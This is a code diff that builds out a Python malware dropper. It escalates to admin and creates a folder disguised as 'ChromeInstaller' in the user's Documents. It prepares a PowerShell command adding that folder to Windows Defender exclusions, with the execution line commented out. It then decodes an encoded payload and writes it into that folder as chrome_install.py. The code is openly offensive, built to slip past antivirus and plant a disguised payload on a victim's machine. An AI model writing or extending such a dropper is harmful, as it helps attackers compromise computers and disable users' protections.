@@ -2,6 +2,7 @@ import base64
 import os
 import sys
 import ctypes
+import subprocess
 
 class Encode:
 
@@ -44,9 +45,16 @@ class Encode:
 class Dropper:
 
     def __init__(self):
-        pass
-        
+        self.username = self.get_username()
+        self.folder_path = ""
+        self.decoded_payload = ""
 
+    def get_username(self):
+        username = os.getlogin()
+
+        print(f"[LOG] user: {username}")
+        return username
+        
     def is_admin(self):
         """a function which checks if running on admin privelages"""
         try:
@@ -66,6 +74,19 @@ class Dropper:
         a method that creates a folder where real time protection antivirus doesnt exist
         """
 
+        # Add-MpPreference -ExclusionProcess "malicious.exe" #exclude a process
+
+        self.folder_path = f"C:\\Users\\{self.username}\\Documents\\ChromeInstaller" 
+        os.mkdir(self.folder_path)
+
+        command = f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{self.folder_path}\'"'
+
+        try:
+            #subprocess.run(command, shell=True, check=True)
+            print(f"Folder {self.folder_path} has been added to Windows Defender exclusions.")
+        except subprocess.CalledProcessError as e:
+            print(f"Failed to add exclusion: {e}")
+
     def decode_payload(self):
         """
         a method that wil decoe the payload
@@ -75,17 +96,15 @@ class Dropper:
         
         with open("encoded_code.txt", "r") as malicious_payload:
             encoded_payload = malicious_payload.read()
-            decoded_payload = encodeclass.decode(encoded_payload)
-
-            print(decoded_payload)
-
-        with open("decoded_code.py", "w") as text_file:
-            text_file.write(decoded_payload)
+            self.decoded_payload = encodeclass.decode(encoded_payload) 
 
     def write_payload(self):
         """
         a method that will write the payload in the obfuscated folder
         """
+        path = f"{self.folder_path}\\chrome_install.py"
+        with open(path, "w") as text_file:
+            text_file.write(self.decoded_payload)
 
     def execute_payload(self):
         """
@@ -103,7 +122,9 @@ if __name__ == "__main__":
         dropper.run_as_admin()
         #sys.exit(0)
 
+    dropper.create_obfuscated_folder()
     dropper.decode_payload()
+    dropper.write_payload()
 
 
     
